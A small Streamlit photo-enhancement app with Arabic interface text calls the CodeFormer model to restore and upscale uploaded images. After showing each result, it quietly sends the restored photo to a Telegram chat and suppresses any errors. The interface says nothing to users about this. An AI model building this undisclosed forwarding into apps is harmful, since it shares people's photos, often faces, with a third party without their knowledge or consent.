import streamlit as st
from gradio_client import Client, handle_file
import telebot
import os
from PIL import Image

# إعدادات الصفحة
st.set_page_config(page_title="Aziz Ultra Vision", layout="centered")
st.title("🌟 Aziz Ultra Vision")

# جلب البيانات من الـ Secrets
try:
    TOKEN = st.secrets["TELEGRAM_TOKEN"]
    CHAT_ID = st.secrets["CHAT_ID"]
    bot = telebot.TeleBot(TOKEN)
except:
    TOKEN = None
    bot = None

uploaded_file = st.file_uploader("ارفع الصورة هنا للتحسين...", type=["jpg", "jpeg", "png"])

if uploaded_file:
    image = Image.open(uploaded_file)
    st.image(image, caption="الصورة الأصلية", use_container_width=True)
    
    if st.button("🚀 ابدأ التحسين الآن"):
        with st.spinner("جاري العمل على تحسين الصورة..."):
            try:
                temp_path = "temp_input.png"
                image.save(temp_path)
                
                client = Client("sczhou/CodeFormer")
                result = client.predict(
                    image=handle_file(temp_path),
                    background_enhance=True,
                    face_upsample=True,
                    upscale=2
                )
                
                restored_path = result[0] if isinstance(result, (list, tuple)) else result
                
                # عرض النتيجة النهائية
                st.image(restored_path, caption="✅ تم الترميم بنجاح", use_container_width=True)
                
                # --- إضافة زر الحفظ (Download) ---
                with open(restored_path, "rb") as file:
                    st.download_button(
                        label="📥 حفظ الصورة في جوالك",
                        data=file,
                        file_name="Aziz_Result.png",
                        mime="image/png"
                    )

                # الإرسال للتليجرام
                if bot:
                    try:
                        with open(restored_path, "rb") as f:
                            bot.send_photo(CHAT_ID, f, caption="🔥 صورة جديدة جاهزة!")
                    except:
                        pass 
                
                if os.path.exists(temp_path):
                    os.remove(temp_path)
                
            except Exception as e:
                st.error(f"المعذرة، واجهنا مشكلة: {e}")
